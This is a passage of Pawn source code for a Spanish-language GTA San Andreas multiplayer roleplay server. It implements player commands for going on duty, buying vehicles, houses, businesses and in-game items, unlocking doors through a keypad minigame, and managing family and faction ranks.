				#if defined ANUNCIO_SERVICIO
			    new Str[100];
			    A_Format(Str,"> (GOBIERNO) El militar "#CLSEM"%s "#CBLANCO"está en servicio.",NombreJugador_(playerid));
				MensajeTodos(C_BLANCO,Str);
				#endif
			    Mensaje(playerid,-1,"- Ahora estás en servicio, tu nombre se marcó con color.");
				SetPVarInt(playerid,"FAC_ENSERVICIO",1);
				SetPlayerColor(playerid,C_DUTYLSEM);
				return 1;
			}
		}
		return Error(playerid,"No eres ni médico, ni policía.");
	}

	CMD:puerta(playerid, params[])
	{
		if(!GetPlayerInterior(playerid) && !GetPlayerVirtualWorld(playerid))
		{
		    foreach(Casas, i) if(IsPlayerInRangeOfPoint(playerid, 2.0, InfoCasa[i][cEntrada_x], InfoCasa[i][cEntrada_y], InfoCasa[i][cEntrada_z]))
		    {
		        if(InfoCasa[i][cComprada] == false) return Error(playerid, "¡Esta casa no tiene dueño!");
		        if(InfoCasa[i][cCerrada] == false) return Error(playerid, "¡Esta casa no está cerrada!");
		        if(UsandoHackPad[playerid]) return Error(playerid, "¡Ya estas intentando desbloquear una puerta!");
		        ShowKeyPad(playerid);
		        SetPVarInt(playerid, "H_TYPE_HACK", H_TYPE_DOOR);
		        SetPVarInt(playerid, "H_HOUSE_ID", i);
		        Mensaje(playerid, -1, "Escribe la "#CVERDE"contraseña "#CBLANCO"para desbloquear la puerta. "#CINFO"ENTER "#CBLANCO"para salir/confirmar.");
		        return 1;
			}
		}
		return Error(playerid, "¡Debes estar en la puerta de una casa!");
	}

	CMD:comprar(playerid,params[])
	{
		if(!strcmp(params,"vehiculo",true))
		{
			Comando_En_Auto
			new
				VehID = GetPlayerVehicleID(playerid),
				Precio = InfoVeh[VehVenta_ID(VehID)][vPrecio],
				Float:PX,Float:PY,Float:PZ,Float:Angulo,
				RPOS = random(4);

			if(VehVenta_ID(VehID) == 0) return Error(playerid,"¡Este vehículo no está a la venta!");
			if(GetPlayerMoney(playerid) < Precio) return Error(playerid,"¡No tienes suficiente dinero!");
			if(!strmatch(InfoVeh[VehVenta_ID(VehID)][vComprador], "Sin Dueño")) return Error(playerid, "¡Este vehículo ya tiene dueño!");
			if(InfoJugador[playerid][jHoras] < 2) return Error(playerid, "¡Debes jugar al menos dos horas para comprar un vehículo!");
			new Total_Vehiculos;
			foreach(VehVenta,v)
			{
				if(EsDuenoVeh(playerid,v))
				{
					++Total_Vehiculos;
				}
			}
			if(Total_Vehiculos >= MAX_VEH_PERSONA_2) return Mensaje(playerid,-1,"¡Puedes tener hasta "#MAX_VEH_PERSONA_2" vehículos!");
			if(InfoVeh[VehVenta_ID(VehID)][vUsado] == false)
			{
				if(IsPlayerInRangeOfPoint(playerid,80,POS_GROTTI) || IsPlayerInRangeOfPoint(playerid,100,-963.00000000,1918.09997559,40.90000153))
				{//grotti
					switch(RPOS)
					{
					    case 0:{PX = 549.2880; PY = -1265.6758; PZ = 16.8671; Angulo = 303.8928;  }
					    case 1:{PX = 551.0441; PY = -1271.9528; PZ = 16.8700; Angulo = 293.0102;  }
					    case 2:{PX = 550.0951; PY = -1276.6511; PZ = 16.8731; Angulo = 288.4652;  }
					    case 3:{PX = 565.3466; PY = -1276.4271; PZ = 16.8670; Angulo = 12.7604;   }
					}
				}
				else if(IsPlayerInRangeOfPoint(playerid,250,475.1903,-1823.1696,5.0115))
				{//beach motors
				    if(EsBarco(GetVehicleModel(VehID)))
				    {
				        PX = 426.3963; PY = -1953.5404; PZ = -1.5957;
					}
					else
					{
						switch(RPOS)
						{
						    case 0:{PX = 448.8235; PY = -1812.5059; PZ = 5.2032; Angulo = 90.2644; }
						    case 1:{PX = 449.2333; PY = -1806.0627; PZ = 5.2032; Angulo = 85.5192; }
						    case 2:{PX = 443.0993; PY = -1801.5278; PZ = 5.2032; Angulo = 87.1295; }
						    case 3:{PX = 439.3910; PY = -1808.8623; PZ = 5.1588; Angulo = 66.9328; }
	   					}
					}
				}
				else if(IsPlayerInRangeOfPoint(playerid,100,1790.0571,-1910.6516,13.3967))
				{//unity
					switch(RPOS)
					{
					    case 0:{PX = 1813.9641; PY = -1899.7959; PZ = 13.3100; Angulo = 175.7087;  }
					    case 1:{PX = 1813.8983; PY = -1908.6429; PZ = 13.3100; Angulo = 180.6818;  }
					    case 2:{PX = 1814.0339; PY = -1919.8571; PZ = 13.3100; Angulo = 180.6980;  }
					    case 3:{PX = 1814.0339; PY = -1919.8571; PZ = 13.3100; Angulo = 180.6980;  }
					}
				}

				new i = SlotVehLibre();
				if(i < 0) return Error(playerid,"Se podrán crear máximo "#MAX_VEH_VENTA" vehículos de venta. Reporta esto en el foro, asi se agrega más capacidad.");
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,0);

				++Total_Vehiculos_Creados;
				InfoVeh[i][vModelo] = GetVehicleModel(VehID);
				InfoVeh[i][vColor1] = InfoVeh[VehVenta_ID(VehID)][vColor1];
				InfoVeh[i][vColor2] = InfoVeh[VehVenta_ID(VehID)][vColor2];
				InfoVeh[i][vPrecio] = Precio;
				InfoVeh[i][vPosX] = PX;
				InfoVeh[i][vPosY] = PY;
				InfoVeh[i][vPosZ] = PZ;
				InfoVeh[i][vPosA] = Angulo;
				InfoVeh[i][vInt] = 0;
				InfoVeh[i][vVW] = 0;
				alm(InfoVeh[i][vComprador],pName(playerid));
				InfoVeh[i][vPintadoJ] = -1;
				InfoVeh[i][vCerrado] = false;
				RemovePlayerFromVehicle(playerid);
				new VehID_C = CreateVehicle(InfoVeh[i][vModelo],InfoVeh[i][vPosX],InfoVeh[i][vPosY],InfoVeh[i][vPosZ],InfoVeh[i][vPosA],InfoVeh[i][vColor1],InfoVeh[i][vColor2],HORAS_RVEH);
				new StrP[12];
				A_Format(StrP,"%c%c%c-%d%d%d",LetraRandom(),LetraRandom(),LetraRandom(),random(10),random(10),random(10));
				alm(InfoVeh[i][vPlaca],StrP);
				SetVehicleNumberPlate(VehID_C, InfoVeh[i][vPlaca]);
				PutPlayerInVehicle(playerid,VehID_C,0);
				VehVenta_ID(VehID_C) = i;
				ActualizarVehiculo(i);
				VGas[VehID_C] = 100;
	 			ID_VehOriginal[i] = VehID_C;
				Iter_Add(VehVenta,i);
				QuitarDinero(playerid,Precio);
				Mensaje(playerid, C_NEGRO, "==========================================================");
				MensajeF(playerid, -1,"Felicitaciones, ¡Compraste un "#CVERDE"%s"#CBLANCO"! "#CINFO"(PATENTE: %s)",NombreVehiculo(VehID_C),InfoVeh[i][vPlaca]);
				Mensaje(playerid,  -1,"Para encenderle el motor presione "#CVERDE"'~k~~VEHICLE_FIREWEAPON~'"CBLANCO", utilize "#CINFO"/informacion"CBLANCO" para ver todas las opciones disponibles.");
				Mensaje(playerid, C_NEGRO, "==========================================================");
				Mensaje(playerid, C_ROJO, "NOTA IMPORTANTE: "#CBLANCO"Recuerda que debes "#CVERDE"/estacionar "#CBLANCO"tu vehículo en un lugar que no moleste, para así evitar su eliminación.");
				DarPlataGobierno(InfoVeh[i][vPrecio]);
    			#if LOG_CHAT == true
				printf("vehículo ID %i: se ha comprado por %s",i, pName(playerid));
    			#endif
				ShowPlayerDialog(playerid,dColor1,DIALOG_STYLE_LIST,""#CINFO"¿Primer color del vehículo?","- Blanco\n- Negro\n- Rojo\n- Amarillo\n- Verde\n- Azul\n- Celeste\n- Naranja\n- Rosa\n- Violeta\n- Verde Fluor\n- Rojo Fluor\n- Celeste claro","Seleccionar","");
				UpdatePlayerVehicleTD(playerid, true);
			}
			else if(InfoVeh[VehVenta_ID(VehID)][vUsado] == true)
			{
				alm(InfoVeh[VehVenta_ID(VehID)][vComprador], pName(playerid));
				QuitarDinero(playerid,Precio);
				Mensaje(playerid, C_NEGRO, "==========================================================");
				MensajeF(playerid, -1,"Felicitaciones, ¡Compraste un "#CVERDE"%s"#CBLANCO" usado! "#CINFO"(PATENTE: %s)",NombreVehiculo(VehID),InfoVeh[VehVenta_ID(VehID)][vPlaca]);
				Mensaje(playerid, C_NEGRO, "==========================================================");
    			#if LOG_CHAT == true
				printf("vehículo ID %i (usado): se ha comprado por %s", VehVenta_ID(VehID), pName(playerid));
    			#endif
				UpdatePlayerVehicleTD(playerid, true);
			}
			return 1;
		}
		else if(!strcmp(params,"negocio",true))
		{
			if(InfoJugador[playerid][jHoras] < 2) return Error(playerid, "¡Debes jugar al menos dos horas para comprar un vehículo!");
			foreach(Negocios,n)
	   	 	{
       			if(IsPlayerInRangeOfPoint(playerid,2,InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z]))
	        	{
	        	    if(InfoNegocio[n][nComprado] == false)
					{
			            if(GetPlayerMoney(playerid) < InfoNegocio[n][nPrecio]) return Error(playerid,"¡No tienes suficiente dinero!");
						new Total_Negocios;
						foreach(Negocios,i)
						{
						    if(EsDuenoNegocio(playerid,i))
						    {
						        ++Total_Negocios;
							}
						}
						if(Total_Negocios >= MAX_NEGOCIOS_JUGADOR) return Error(playerid,"¡No puedes tener más de "#MAX_NEGOCIOS_JUGADOR" negocio(s)!");
						alm(InfoNegocio[n][nComprador],pName(playerid));
						InfoNegocio[n][nComprado] = true;
						QuitarDinero(playerid,InfoNegocio[n][nPrecio]);
						Mensaje(playerid, C_NEGRO, "==========================================================");
						MensajeF(playerid,-1,"Felicitaciones, ¡Compraste un negocio! "#CVERDE"(%s).",InfoNegocio[n][nNombre]);
						Mensaje(playerid, -1,"Utilize "#CINFO"/informacion "#CBLANCO" para ver todas las opciones disponibles.");
						Mensaje(playerid, C_NEGRO, "==========================================================");
						ActualizarNegocio(n);
						DarPlataGobierno(InfoNegocio[n][nPrecio]);
						ActualizarNegLabel(n);
					}
					else
					{
						Error(playerid,"¡El negocio no está a la venta!");
					}
				}
			}
			return 1;
		}
		else if(!strcmp(params,"casa",true))
		{
			if(InfoJugador[playerid][jHoras] < 2) return Error(playerid, "¡Debes jugar al menos dos horas para comprar un vehículo!");
		    foreach(Casas,c)
	   	 	{
       			if(IsPlayerInRangeOfPoint(playerid,2,InfoCasa[c][cEntrada_x],InfoCasa[c][cEntrada_y],InfoCasa[c][cEntrada_z]))
	        	{
	        	    if(InfoCasa[c][cComprada] == false)
					{
			            if(GetPlayerMoney(playerid) < InfoCasa[c][cPrecio]) return Error(playerid,"¡No tienes suficiente dinero!");
						new Total_Casas;
						foreach(Casas,i)
						{
						    if(EsDuenoCasa(playerid,i))
						    {
						        ++Total_Casas;
							}
						}
						if(Total_Casas >= MAX_CASAS_JUGADOR) return Error(playerid,"¡No puedes tener más de "#MAX_CASAS_JUGADOR" Casa(s)!");
						alm(InfoCasa[c][cComprador],pName(playerid));
						InfoCasa[c][cComprada] = true;
						QuitarDinero(playerid,InfoCasa[c][cPrecio]);
						Mensaje(playerid, C_NEGRO, "==========================================================");
						MensajeF(playerid, -1,"Felicitaciones, ¡Compraste una casa! "#CVERDE"(%s).",InfoCasa[c][cNombre]);
						Mensaje(playerid, -1, "Utilize "#CINFO"/informacion "#CBLANCO"para ver todas las opciones disponibles.");
						Mensaje(playerid, C_NEGRO, "==========================================================");
						ActualizarCasa(c);
						DarPlataGobierno(InfoCasa[c][cPrecio]);
						ActualizarCasaLabel(c);
					}
					else
					{
						Error(playerid,"¡Esta casa no está a la venta!");
					}
				}
			}
			return 1;
		}
		else if(!strcmp(params,"ropa",true))
		{
		    if(EstaEnTiendaRopa(playerid))
		    {

				#if defined VERSION_03x

		        new Sex = InfoJugador[playerid][jSexo];
		        if(Sex == 1)
				{
					ShowModelSelectionMenu(playerid, m_Skins_m, "Ropa de hombre");
				}
				else
				{
					ShowModelSelectionMenu(playerid, m_Skins_f, "Ropa de mujer");
				}
          		SetPVarInt(playerid,"ComprandoRopa",1);
                cmd_datos(playerid, "no_msg");
				LimpiarPantalla(playerid, 10);

				#else // 0.3e

				SetPVarInt(playerid,"EligiendoRopa",1);
				SetPVarInt(playerid,"ID_Ropa",1);
				TextDrawShowForPlayer(playerid,FlechaCRopa[0]);
				TextDrawShowForPlayer(playerid,FlechaCRopa[1]);
				TextDrawShowForPlayer(playerid,CRopa);
				TextDrawShowForPlayer(playerid,SCRopa);
				TextDrawShowForPlayer(playerid,PCRopa);

				SelectTextDraw(playerid,C_ROJO);
				CongelarEx(playerid);
				SetPlayerFacingAngle(playerid,0);
				GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
				InfoJugador[playerid][jVirtualWorld] = GetPlayerVirtualWorld(playerid);
				InfoJugador[playerid][jInterior] = GetPlayerInterior(playerid);
				SetPlayerPos(playerid,181.5607,-83.7518,1002.0307);
				SetPlayerVirtualWorld(playerid,random(99));
				SetPlayerFacingAngle(playerid,116.5);
				AutoRol(playerid,"entra al vestidor");
				SetPlayerCameraPos(playerid,179.000,-85.000,1002.000);
				SetPlayerCameraLookAt(playerid,181.000,-84.000,1002.000);
				SetPlayerInterior(playerid,18);

				#endif

				return 1;
 			}
		    return Error(playerid,"¡No estás en la tienda de ropa!");
		}
		else if(!strcmp(params[0],"bebida",true))
		{
		    if(IsPlayerInRangeOfPoint(playerid,2,499.7788,-18.8157,1000.67))
		    {
		        Dialog(playerid,dElegirBebida,DIALOG_STYLE_LIST,""#CBLANCO"Elija su bebida",""#CINFO"> "#CBLANCO"Agua mineral\t($"#PRECIO_AGUA")\n"#CINFO"> "#CBLANCO"Gaseosa\t($"#PRECIO_GASEOSA")\n"#CINFO"> "#CBLANCO"Cerveza\t($"#PRECIO_CERVEZA")\n"#CINFO"> "#CBLANCO"Vodka\t($"#PRECIO_VODKA")\n","Comprar","Cancelar");
		        return 1;
			}
		    return Error(playerid,"¡No estás en una barra!");
		}
		else if(!strcmp(params[0],"productos",true))
		{
		    if(IsPlayerInRangeOfPoint(playerid,2,-29.5425,-184.9853,1003.546))
		    {
		        Dialog(playerid,dElegirBebida,DIALOG_STYLE_LIST,""#CBLANCO"¿Qué desea comprar?","> Agua mineral\t($"#PRECIO_AGUA")\n> Gaseosa\t($"#PRECIO_GASEOSA")\n> Cerveza\t($"#PRECIO_CERVEZA")\n> Vodka\t($"#PRECIO_VODKA")\n> Cigarrillos\t($5)\n> Encendedor\t($3)\n> Spray\t\t($11)\n> Flores\t($25)\n> Comprar "#CAZUL2"SALDO\n> Seda\t($25)","Comprar","Cancelar");
		        return 1;
			}
		    return Error(playerid,"¡No estás en un 24/7!");
		}
		else if(!strcmp(params,"armas",true))
		{
		    if(IsPlayerInRangeOfPoint(playerid,2,313.8407,-133.2842,999.6016))
		    {
		        if(!InfoJugador[playerid][jHoras]) return Error(playerid,"¡No puedes comprar armas, debes jugar al menos una hora para esto!");
				if(!InfoJugador[playerid][jLicenciaArmas]) return Error(playerid,"¡No tienes liencia de armas!");
		        Dialog(playerid,dElejirArmBal,DIALOG_STYLE_LIST,""#CBLANCO"¿Qué desea comprar?",""#CINFO"> "#CBLANCO"Armas\n"#CINFO"> "#CBLANCO"Balas","Comprar","Cancelar");
		        return 1;
			}
		    return Error(playerid,"¡Aquí no venden armas!");
		}
		else if(!strcmp(params,"accesorios",true))
		{
		    if(EstaEnTiendaRopa(playerid))
		    {

				#if defined VERSION_03x

				//  0.3x  //
		        SetPVarInt(playerid,"ComprandoAccesorios", 1);
				ShowModelSelectionMenu(playerid, m_Accesorios, "Accesorios");
				cmd_datos(playerid, "no_msg");
				LimpiarPantalla(playerid, 10);

				#else

				//  0.3e  //

		        if(GetPVarInt(playerid,"ElijiendoAccesorios")) return Error(playerid,"¡Ya estas elijiendo accesorios!");
				SetPVarInt(playerid,"ElijiendoAccesorios",1);
				TextDrawShowForPlayer(playerid,FlechaCRopa[0]);
				TextDrawShowForPlayer(playerid,FlechaCRopa[1]);
				TextDrawShowForPlayer(playerid,CRopa);
				TextDrawShowForPlayer(playerid,SCRopa);

				GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
				InfoJugador[playerid][jInterior] = GetPlayerInterior(playerid);

				SetPlayerPos(playerid,556.8184,-1253.7656,180.08990);
				SetPlayerInterior(playerid,0);
				SetPlayerFacingAngle(playerid,0);
				SelectTextDraw(playerid,C_ROJO);
				CongelarEx(playerid);
				DeletePVar(playerid,"ATTACH_MOD");
				Accesorio_Obj[playerid] = CreatePlayerObject(playerid,AttachmentObjects[GetPVarInt(playerid,"ATTACH_MOD")][attachmodel],555.7980,-1251.4698,160.08990,0,0,0);
			 	KillTimer2(playerid,TIMER_ACCESORIO);
				Timer_Jugador[playerid][TIMER_ACCESORIO] = SetTimerEx("RotarObjeto",true,200,"i",playerid);
				SetPlayerCameraPos(playerid,556.1489,-1252.2582,160.08990);
				SetPlayerCameraLookAt(playerid,0,0,0);
				new Str[60];
				format(Str,sizeof Str,"~n~~n~~n~~n~~n~~n~~w~Gorra (policia)~n~~p~$%d",AttachmentObjects[GetPVarInt(playerid,"ATTACH_MOD")][attachprecio]);
				GameTextForPlayer(playerid,Str,10000,3);

				#endif

				return 1;
 			}
		    return Error(playerid,"¡No estás en la tienda de ropa!");
		}
		else if(!strcmp(params,"elementos",true))
		{
			if(IsPlayerInRangeOfPoint(playerid,2,1691.1962,-1949.8903,8.2500))
			{
			    if(InfoJugador[playerid][jNivel] < 2) return Error(playerid, "¡Debes ser nivel 2 para utilizar este comando!");
   			    Dialog(playerid,dMercadoNegro,DIALOG_STYLE_LIST,""#CAZUL2"Mercado negro","> Venda\t\t($20)\n> Soga\t\t\t($32)\n> 9mm-40 balas-\t($400)\n> Bomba\t\t($35000)\n> Máscara\t\t($30)\n> Bate\t\t\t($180)\n> Dinamita\t($18000)\n> Pinza\t\t($160)","Aceptar","Cancelar");
				return 1;
  			}
		    return Error(playerid,"¡No estás en el mercado negro!");
		}
		else if(!strcmp(params,"tecnologia",true))
		{
			if(IsPlayerInRangeOfPoint(playerid,2,-1705.09997559,1887.00000000,1068.80004883))
			{
   			    Dialog(playerid,dCTecnologia,DIALOG_STYLE_LIST,""#CAZUL2"Comprar tecnología","> Celular\t\t\t($"#PRECIO_CEL")\n> GPS\t\t\t\t($"#PRECIO_GPS")\n"#CINFO"> "#CBLANCO"Comprar "#CAZUL2"SALDO\n> Cámara\t\t\t($120)\n> Buscador de vehículos\t($"#PRECIO_BUSCADORVEH")","Aceptar","Cancelar");
				return 1;
  			}
		    return Error(playerid,"¡No estás en un lugar que venda tecnología!");
		}
		else if(!strcmp(params,"muebles",true))
		{
			if(IsPlayerInRangeOfPoint(playerid,2,-1705.09997559,1887.00000000,1068.80004883))
			{

			    #if defined VERSION_03x

		        SetPVarInt(playerid,"ComprandoMuebles", 1);
				ShowModelSelectionMenu(playerid, m_Muebles, "Muebles");
				cmd_datos(playerid, "no_msg");
				LimpiarPantalla(playerid, 10);
				SetPVarInt(playerid,"mS_hide_list_off", 1);

				#else

				new StrDialog[((sizeof ObjetosInterior)*29)+15], StrF[42];

				for(new i; i < sizeof ObjetosInterior; i++)
				{
					A_Format(StrF,"%s "#CVERDE"($%d)\n", ObjetosInterior[i][2], ObjetosInterior[i][1]);
				    strcat(StrDialog, StrF );
				}

				Dialog(playerid, dCMueble, DIALOG_STYLE_LIST, "- Comprar Muebles", StrDialog, "Comprar", "Cancelar");

				#endif

				return 1;
  			}
		    return Error(playerid,"¡No estás en un lugar que vendan muebles! (HIPERMERCADO)");
		}
		else if(!strcmp(params,"medicamentos",true))
		{
			if(IsPlayerInRangeOfPoint(playerid,2,170.6999969,-69.5999985,963.2000122))
			{
   			    Dialog(playerid,dCMedicamentos,DIALOG_STYLE_LIST,""#CAZUL2"Comprar medicamentos","> Ibuprofeno x400 ($50 x 5 pastillas)\n> Ibuprofeno x600 ($100 x 5 pastillas)","Aceptar","Cancelar");
				return 1;
  			}
		    return Error(playerid,"¡No estás en una farmacia!");
		}
		else if(!strcmp(params,"droga",true))
		{
		    if(IsPlayerInRangeOfPoint(playerid,2,CORDS_DROGA))
		    {
		        Dialog(playerid,dCDroga,DIALOG_STYLE_LIST,"Seleccione la droga:","Marihuana\t($50)\nCocaina\t($150)\nHeroina\t($150)\nOpio\t\t($250)\nCannabis\t($300)","Comprar","Cancelar");
				return 1;
			}
		}
		else if(!strcmp(params,"comida",true))
		{
			if(IsPlayerInRangeOfPoint(playerid,5,373.9077,-119.6210,1001.4922))//pizzeria
			{
				Dialog(playerid,dCComida_pi,DIALOG_STYLE_LIST,""#CAZUL2"PIZZERIA - MENÚ","- Gaseosa\t\t($8)\n- Pizza de Muzzarela\t($20)\n- Pizza especial\t\t($22)\n- Pizza de Huevo\t($25)","Comprar","Cancelar");
			}
			else if(IsPlayerInRangeOfPoint(playerid,5,375.7025,-68.0881,1001.5151))//Burger
			{
				Dialog(playerid,dCComida_h,DIALOG_STYLE_LIST,""#CAZUL2"BURGERSHOT - MENÚ","- Gaseosa\t\t($8)\n- Hamburguesa simple\t($12)\n- Hamburguesa doble\t($20)\n- Hamburguesa triple\t($25)","Comprar","Cancelar");
			}
			else if(IsPlayerInRangeOfPoint(playerid,5,369.5210,-6.5896,1001.8589))//Polleria
			{
				Dialog(playerid,dCComida_po,DIALOG_STYLE_LIST,""#CAZUL2"POLLERIA - MENÚ","- Gaseosa\t\t($8)\n- Ala de pollo\t($15)\n- Pata de pollo\t($20)\n- Pechuga de pollo\t($25)","Comprar","Cancelar");
			}
			else Error(playerid,"¡No estás en un lugar que vendan comida!");
			return 1;
		}
	    if(!strcmp(params,"boleto",false))
	    {
	        if(IsPlayerInRangeOfPoint(playerid,3,-1372.0627, 1649.1442, 1052.6855))
	        {
	            Dialog(playerid, dCBoleto, DIALOG_STYLE_MSGBOX,"- Comprar boleto",""#CBLANCO"¿Deseas comprar el boleto, y alquilar una Sanchez por $400?","Aceptar","Cancelar");
				return 1;
			}
	        else if(IsPlayerInRangeOfPoint(playerid,3,-1363.1294, 933.6328, 1036.4626))
	        {
	            Dialog(playerid, dCBoleto, DIALOG_STYLE_MSGBOX,"- Comprar boleto",""#CBLANCO"¿Deseas comprar el boleto, y alquilar una Monster por $500?","Aceptar","Cancelar");
				return 1;
			}
	        else if(IsPlayerInRangeOfPoint(playerid,3,-1424.4020, -664.6694, 1065.5156))
	        {
	            Dialog(playerid, dCBoleto, DIALOG_STYLE_LIST,"- Comprar boleto - Elegir vehículo "#CVERDE"($500)","> Uranus\n> Jester\n> Sultan\n> Stratum\n> Elegy","Aceptar","Cancelar");
				return 1;
			}
	        if(IsPlayerInRangeOfPoint(playerid,3,-1404.4028, -256.3459, 1043.6334))
	        {
	            Dialog(playerid, dCBoleto, DIALOG_STYLE_MSGBOX,"- Comprar boleto",""#CBLANCO"¿Deseas comprar el boleto, y alquilar un Hotring Racer B por $600?","Aceptar","Cancelar");
				return 1;
			}
			else Error(playerid, "¡Aquí no venden boletos!");
		}
		if(!strcmp(params,"bidon",true))
		{
		    if(GetPlayerMoney(playerid) < 40) return Error(playerid, "¡Necesitas al menos ~g~$40~w~!");
		    if(!EstaEnEstacionServicio(playerid)) return Error(playerid, "¡Debes estar en una estación de servicio!");
		    if(HaveObject(playerid, OBJ_BIDON)) return Error(playerid, "¡Puedes tener solo un bidón!");
		    if(!AddToInv(playerid, OBJ_BIDON)) return Error(playerid, "¡No tienes más espacio en el inventario!");
		    AutoRol(playerid, "compra un bidón con 10 litros de combustible");
		    Mensaje(playerid, -1,     "Para utilizar el bidón, tipee "#CINFO"/usar bidon "#CBLANCO"dentro del vehículo al que desees cargarle combustible.");
		    Mensaje(playerid, C_ROJO, "NOTA: "#CBLANCO"Recuerde que el bidón se guardó en su inventario, primero deberá sacarlo con la letra "#CVERDE"N");
		    QuitarDinero(playerid, 40);
		    return 1;
		}

		return ParamsINC(playerid,"/comprar <ITEM>");
	}

	CMD:volver(playerid,params[])
	{
	    if(GetPVarInt(playerid,"EligiendoRopa") == 1)
	    {
			SetPVarInt(playerid,"EligiendoRopa",1);
			SetPVarInt(playerid,"ID_Ropa",1);
			TextDrawShowForPlayer(playerid,FlechaCRopa[0]);
			TextDrawShowForPlayer(playerid,FlechaCRopa[1]);
			TextDrawShowForPlayer(playerid,CRopa);
			TextDrawShowForPlayer(playerid,SCRopa);
			TextDrawShowForPlayer(playerid,PCRopa);
			SelectTextDraw(playerid,C_ROJO);
		    return 1;
		}
		if(GetPVarInt(playerid,"EnCajero") == 1 || GetPVarInt(playerid,"ElijiendoAccesorios"))
		{
		    SelectTextDraw(playerid,C_ROJO);
		    return 1;
		}
		return Error(playerid,"¡No estás bugueado!");
	}

	CMD:crearfamilia(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"¡Este comando lo utilizan solo dueños!");
		Para_Admin_Servicio
		if(sscanf(params,"uis[32]",params[0],params[1], params[2])) return ParamsINC(playerid,"/crearfamilia [ID LIDER] [PANDILLA] [NOMBRE FAMILIA]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Ese ID no está conectado!");

		if(strlen(params[2]) > (32) ) return Error(playerid,"¡El nombre es demasiado largo!");
		new ID_FAM = -1;

		Loop(i, MAX_FAMILIAS, 1) if(!FamiliaExiste(i))
		{
	 		ID_FAM = i;
	 		break;
		}

		if( ID_FAM == -1 ) return Error(playerid,"¡No se pueden crear más de "#MAX_FAMILIAS" familias!");

		InfoJugador[params[0]][jLiderFam] = ID_FAM;

		GetPlayerPos(playerid,InfoFamilia[ID_FAM][fPos_x],InfoFamilia[ID_FAM][fPos_y],InfoFamilia[ID_FAM][fPos_z]);

		alm(InfoFamilia[ID_FAM][fNombre],params[2]);

		if(params[1])
		{
			MensajeAdminF(C_ADMINISTRADOR,"[ADMINISTRACIÓN] > "#CBLANCO"%s creó la pandilla %s (ID %d), y su lider será %s",Colaborador,NombreJugador_(playerid),InfoFamilia[ID_FAM][fNombre],ID_FAM,NombreJugador_(params[0]));
			InfoFamilia[ID_FAM][fPandilla] = true;
		}
		else
		{
			MensajeAdminF(C_ADMINISTRADOR,"[ADMINISTRACIÓN] > "#CBLANCO"%s creó la familia %s (ID %d), y su lider será %s",Colaborador,NombreJugador_(playerid),InfoFamilia[ID_FAM][fNombre],ID_FAM,NombreJugador_(params[0]));
		}

		ActualizarFamilia(ID_FAM);

		return 1;
	}

	CMD:nombrerango(playerid,params[])
	{
	    if(!InfoJugador[playerid][jLiderFam]) return Error(playerid,"¡No eres lider de ninguna familia!");
	    if(sscanf(params,"is[24]",params[0],params[1])) return ParamsINC(playerid,"/nombrerango [Número de Rango] [Nombre]");
		if(params[0] > 5 || params[0] < 1) return Error(playerid,"El Rango debe ser entre 1 y 5.");
		Loop(i,MAX_FAMILIAS,1)
		{
		    if(InfoJugador[playerid][jLiderFam] == i)
			{
				switch(params[0])
				{
					case 1: alm(InfoFamilia[i][fRango_1],params[1]);
					case 2: alm(InfoFamilia[i][fRango_2],params[1]);
					case 3: alm(InfoFamilia[i][fRango_3],params[1]);
					case 4: alm(InfoFamilia[i][fRango_4],params[1]);
					case 5: alm(InfoFamilia[i][fRango_5],params[1]);
				}
				new str[47 + 24];
				format(str,sizeof(str),"> [FAMILIA] %s cambio el nombre del rango %d a %s",NombreJugador_(playerid),params[0],params[1]);
				MensajeFamilia(InfoJugador[playerid][jLiderFam],str);
				ActualizarFamilia(i);
				return 1;
			}
		}
		return 1;
	}


	CMD:rango(playerid,params[])
	{
	    new
			ID_PFac = InfoJugador[playerid][jLider],
	    	ID_PFam = InfoJugador[playerid][jLiderFam],
			ID,
			Item[10],
			Val;

		if(!ID_PFac && !ID_PFam) return Error(playerid,"¡No eres lider de ninguna familia/facción!");
		if(sscanf(params,"us[10]i",ID,Item,Val)) return ParamsINC(playerid,"/rango [ID/NOMBRE] <faccion - familia> [RANGO]");
		if(!IsPlayerConnected(ID)) return Error(playerid,"¡Jugador desconectado!");
		if(Val < 1) return Error(playerid,"¡Debe ser un rango positivo!");
		if(strfind(params,"faccion",true) != -1)
		{
		    if(InfoJugador[ID][jLider]) return Error(playerid,"¡No le puedes cambiar el rango a un lider!");
		    if(!ID_PFac) return Error(playerid,"¡No eres lider de ninguna facción!");
		    if(InfoJugador[ID][jMiembro] != ID_PFac) return Error(playerid,"¡Ese jugador no pertenece a tu facción!");
		    if(!IsValidRank(ID_PFac, Val)) return Error(playerid,"¡Rango inválido!");
		    InfoJugador[ID][jRango] = Val;
		    new Str[128];
			A_Format(Str,"> "#CBLANCO"%s le cambió el rango a %s "#CPOSITIVO"(RANGO: %d)",NombreJugador_(playerid),NombreJugador_(ID),Val);
			MensajeFaccion(ID_PFac,Str);
			return 1;
		}
		else if(strfind(params,"familia",true) != -1)
		{
		    if(InfoJugador[ID][jLiderFam]) return Error(playerid,"¡No le puedes cambiar el rango a un lider!");
		    if(Val > 5) return Error(playerid,"¡Las familias tienen máximo 5 rangos!");
		    if(!ID_PFam) return Error(playerid,"¡No eres lider de ninguna familia!");
		    if(InfoJugador[ID][jMiembroFam] != ID_PFam) return Error(playerid,"¡Ese jugador no pertenece a tu familia!");
		    InfoJugador[ID][jRangoFam] = Val;
		    new Str[128];
			A_Format(Str,"> "#CBLANCO"%s le cambió el rango a %s "#CPOSITIVO"(RANGO: %d)",NombreJugador_(playerid),NombreJugador_(ID),InfoJugador[ID][jRangoFam]);
			MensajeFamilia(ID_PFam,Str);
			return 1;
		}
		return ParamsINC(playerid,"/rango [ID/NOMBRE] [faccion/familia] [RANGO]");
	}

	CMD:invitar(playerid,params[])
	{
	    new
			ID_PFac = InfoJugador[playerid][jLider],
	    	ID_PFam = InfoJugador[playerid][jLiderFam];
	    	
		if(!ID_PFac && !ID_PFam)
			return Error(playerid,"¡No eres lider de ninguna familia/facción!");

		if(sscanf(params,"us[20]",params[0],params[1]))
			return ParamsINC(playerid,"/invitar [id/nombre] [faccion/famila]");

		if(params[0] == INVALID_PLAYER_ID)
